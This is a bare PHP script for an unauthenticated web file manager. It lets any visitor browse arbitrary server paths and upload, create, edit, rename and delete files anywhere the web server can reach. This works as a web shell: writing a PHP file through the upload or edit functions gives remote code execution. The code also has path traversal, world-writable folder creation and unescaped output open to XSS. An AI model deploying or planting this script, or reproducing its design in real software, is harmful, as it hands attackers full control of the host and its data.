<?php
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();

function displayDirectory($path) {
    $items = array_diff(scandir($path), ['.', '..']);
    echo "<h3>Current Directory: $path</h3><ul>";
    foreach ($items as $item) {
        $itemPath = realpath($path . DIRECTORY_SEPARATOR . $item);
        if (is_dir($itemPath)) {
            echo "<li><a href='?path=$itemPath'>$item</a></li>";
        } else {
            echo "<li>$item 
                <a href='?path=$path&action=edit&item=$item'>Edit</a> | 
                <a href='?path=$path&action=delete&item=$item'>Delete</a> | 
                <a href='?path=$path&action=rename&item=$item'>Rename</a>
            </li>";
        }
    }
    echo "</ul>";
}

function handleFileUpload($path) {
    if (!empty($_FILES['file']['name'])) {
        $target = $path . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            echo "<p>File uploaded successfully!</p>";
        } else {
            echo "<p style='color:red;'>Failed to upload file.</p>";
        }
    }
}

function createNewFolder($path) {
    if (!empty($_POST['folder_name'])) {
        $folderPath = $path . DIRECTORY_SEPARATOR . $_POST['folder_name'];
        if (!file_exists($folderPath)) {
            if (mkdir($folderPath, 0777, true)) {
                echo "<p>Folder created: {$_POST['folder_name']}</p>";
            } else {
                echo "<p style='color:red;'>Failed to create folder. Check permissions.</p>";
            }
        } else {
            echo "<p>Folder already exists.</p>";
        }
    }
}

function createNewFile($path) {
    if (!empty($_POST['file_name'])) {
        $filePath = $path . DIRECTORY_SEPARATOR . $_POST['file_name'];
        if (!file_exists($filePath)) {
            if (file_put_contents($filePath, '') !== false) {
                echo "<p>File created: {$_POST['file_name']}</p>";
            } else {
                echo "<p style='color:red;'>Failed to create file. Check permissions.</p>";
            }
        } else {
            echo "<p>File already exists.</p>";
        }
    }
}

function editFile($filePath) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($filePath, $_POST['content']);
        echo "<p>File updated successfully!</p>";
    }
    $content = file_exists($filePath) ? htmlspecialchars(file_get_contents($filePath)) : '';
    echo "<form method='POST'>
            <textarea name='content' style='width:100%; height:300px;'>$content</textarea><br>
            <button type='submit'>Save</button>
          </form>";
}

function deleteFile($filePath) {
    if (file_exists($filePath)) {
        unlink($filePath);
        echo "<p>File deleted successfully.</p>";
    } else {
        echo "<p style='color:red;'>File not found.</p>";
    }
}

function renameItem($filePath) {
    if (!empty($_POST['new_name'])) {
        $newPath = dirname($filePath) . DIRECTORY_SEPARATOR . $_POST['new_name'];
        if (rename($filePath, $newPath)) {
            echo "<p>Item renamed successfully.</p>";
        } else {
            echo "<p style='color:red;'>Failed to rename item.</p>";
        }
    } else {
        echo "<form method='POST'>
                <input type='text' name='new_name' placeholder='New Name'>
                <button type='submit'>Rename</button>
              </form>";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        handleFileUpload($path);
    } elseif (isset($_POST['folder_name'])) {
        createNewFolder($path);
    } elseif (isset($_POST['file_name'])) {
        createNewFile($path);
    }
}

if (isset($_GET['action']) && isset($_GET['item'])) {
    $itemPath = $path . DIRECTORY_SEPARATOR . $_GET['item'];
    switch ($_GET['action']) {
        case 'edit':
            editFile($itemPath);
            break;
        case 'delete':
            deleteFile($itemPath);
            break;
        case 'rename':
            renameItem($itemPath);
            break;
    }
}

echo "<style>
        body { background-color: #FFFACD; font-family: Arial, sans-serif; text-align: center; }
        form { margin: 10px auto; max-width: 400px; }
        input, button { padding: 10px; margin: 5px; }
      </style>";

echo "<a href='?path=" . dirname($path) . "'>Go Up</a>";
displayDirectory($path);

echo "<h3>Upload File</h3>
      <form method='POST' enctype='multipart/form-data'>
        <input type='file' name='file'>
        <button type='submit'>Upload</button>
      </form>";

echo "<h3>Create Folder</h3>
      <form method='POST'>
        <input type='text' name='folder_name' placeholder='Folder Name'>
        <button type='submit'>Create</button>
      </form>";

echo "<h3>Create File</h3>
      <form method='POST'>
        <input type='text' name='file_name' placeholder='File Name'>
        <button type='submit'>Create</button>
</form>";
?>